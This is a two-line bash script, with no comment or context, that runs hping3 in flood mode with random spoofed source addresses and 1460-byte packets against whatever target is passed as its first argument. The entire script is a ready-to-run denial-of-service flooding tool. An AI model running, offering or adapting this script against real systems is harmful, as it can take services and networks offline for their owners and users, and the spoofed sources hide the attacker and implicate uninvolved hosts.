#!/bin/bash
hping3 -V -d 1460 --rand-source --flood "$1"
